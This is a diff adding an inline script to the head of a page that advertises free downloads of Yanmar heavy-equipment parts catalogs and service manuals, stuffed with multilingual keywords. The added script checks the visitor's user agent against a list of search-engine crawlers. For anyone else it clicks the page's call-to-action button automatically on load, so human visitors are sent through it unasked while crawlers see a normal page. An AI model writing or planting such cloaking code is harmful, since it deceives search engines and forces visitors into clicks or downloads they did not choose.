@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Yanmar Heavy Equipment EPC Service &amp; Part Manuals 2020</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Yanmar Heavy Equipment EPC Service &amp; Part Manuals 2020, a comprehensive electronic parts catalog and service manual for Yanmar machinery.">
     <meta name="keywords" content="Yanmar Heavy Equipment EPC Service &amp; Part Manuals 2020, Yanmar Heavy Equipment EPC Service 2020, Yanmar Heavy Equipment EPC part manuals, Yanmar Heavy Equipment EPC download, Yanmar Heavy Equipment EPC free download, Yanmar Heavy Equipment EPC 2020 download, Yanmar heavy machinery EPC, Yanmar heavy equipment service manuals, Yanmar 2020 EPC catalog, Yanmar 2020 parts catalog, Yanmar 2020 service manuals, Yanmar Electronic Parts Catalog 2020, Yanmar technical manuals free download, Yanmar hydraulic diagrams 2020, Yanmar maintenance tools, Yanmar repair guides 2020, Yanmar equipment manuals PDF, Yanmar service PDF 2020, Yanmar 2020 troubleshooting manuals, Yanmar shop manuals 2020, catalogue free download, Янмар тяжелая техника EPC сервис и руководство по частям 2020, Янмар оборудование EPC 2020, Янмар руководство по ремонту 2020, каталог Янмар 2020 скачать бесплатно, каталог запчастей Янмар 2020 скачать, каталог запчастей Янмар, ямар технические руководства, Yanmar maquinaria pesada EPC servicio y manuales de piezas 2020, Yanmar EPC 2020, manuales Yanmar 2020, Yanmar mantenimiento 2020, catálogo de piezas Yanmar 2020, Yanmar équipement lourd EPC service et manuels de pièces 2020, Yanmar EPC 2020, manuels Yanmar 2020, catalogue Yanmar 2020">
     <style>
